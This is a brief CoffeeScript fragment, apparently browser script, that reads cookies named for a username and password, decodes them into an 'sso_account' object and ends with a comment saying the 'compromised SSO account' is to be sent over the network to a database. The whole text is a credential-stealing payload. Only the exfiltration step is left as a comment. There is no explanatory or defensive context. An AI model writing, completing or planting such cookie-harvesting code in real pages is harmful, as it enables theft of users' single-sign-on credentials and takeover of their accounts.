USERNAME = '_USERNAME'
PASSWORD = '_PASSWORD'

sso_account = {
    username: null,
    pw: null
}

for c in document.cookie.split(';')
    c_stripped = decodeURIComponent(c.split('=')[1])
    c.includes(USERNAME) and sso_account.username = c_stripped
    c.includes(PASSWORD) and sso_account.pw = c_stripped

###
...make net calls to database,
store the compromised SSO account
###
